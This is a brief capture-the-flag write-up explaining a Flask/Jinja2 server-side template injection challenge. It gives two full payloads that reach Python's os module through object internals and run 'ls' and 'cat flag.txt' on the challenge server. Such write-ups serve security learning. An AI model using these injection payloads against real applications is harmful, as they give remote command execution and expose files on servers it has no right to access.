This challenge was easy to understand but the execution was a little bit tricky (Almost for me) beacuse you had to use a lot of concat references from Python, however you can always make a little research and find out how it works.

Ok, so in the very first screen we saw a weird message which was telling us literally what we have to use in order to get the flag.


The whole challenge is based on Flask/Jinja2 SSTi explotation.

Basically if you concat {{4*4}} at the end of the URL the page will show the output of that operation so we could take advantage of that vulnerability and execute linux commands as ls to locate the flag and cat for reading it.

That being said we will import the os library from Python for execute those commands.


http://46.101.86.54:30374/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}

This command will give us all the files located into the current directory.

We can easily see that flag.txt is inside this directory so we just have to read the content of the file.


http://46.101.86.54:30374/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}


Easy!